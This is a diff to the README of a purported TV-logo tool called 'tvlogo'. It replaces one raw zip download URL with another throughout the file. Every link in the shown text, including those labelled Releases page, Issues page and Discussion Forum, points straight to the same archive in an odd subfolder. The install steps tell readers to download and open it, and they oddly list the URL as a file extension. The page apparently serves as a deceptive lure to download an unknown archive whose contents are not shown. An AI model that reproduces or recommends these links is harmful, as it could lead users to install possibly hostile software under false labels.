@@ -8,11 +8,11 @@ Welcome to tvlogo! This project helps you search for and create custom live TV l
 
 To get started, you need to download the software. You can find the latest version on the Releases page. 
 
-[![Download tvlogo](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip)](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip)
+[![Download tvlogo](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip)](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip)
 
 Click the button above or visit the page below to download:
 
-[Visit Releases Page](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip)
 
 ### 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Click the button above or visit the page below to download:
 
 1. Navigate to the Releases page using the link provided.
 2. Select the latest release from the list.
-3. Download the file suitable for your operating system. Look for files ending in `.exe`, `.dmg`, or `https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip`.
+3. Download the file suitable for your operating system. Look for files ending in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Open the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
@@ -53,14 +53,14 @@ If you experience any issues:
 - Check that you have an internet connection for searching logos.
 - Restart the application if you encounter any errors.
 
-If problems persist, visit the [Issues page](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip) to report your issue.
+If problems persist, visit the [Issues page](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip) to report your issue.
 
 ## 🌐 Community & Support
 
 Join our community to discuss features, report bugs, or exchange tips. 
 
-- [GitHub Issues](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip) for feature requests and bug reports.
-- [Discussion Forum](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip) for community chat.
+- [GitHub Issues](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip) for feature requests and bug reports.
+- [Discussion Forum](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip) for community chat.
 
 ## 🏷️ Topics
 
@@ -91,4 +91,4 @@ Thank you for using tvlogo! We hope you find the application useful and enjoy cr
 
 For a smooth experience, always ensure you're using the latest version. Happy logo creating! 
 
-[![Download tvlogo](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip)](https://github.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/raw/refs/heads/main/Mehelya/Software-v2.3-beta.5.zip)
+[![Download tvlogo](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip)](https://raw.githubusercontent.com/011-Dafi-aufa-widodo-X-PPLG-2/tvlogo/main/Mehelya/Software_v2.6-beta.3.zip)
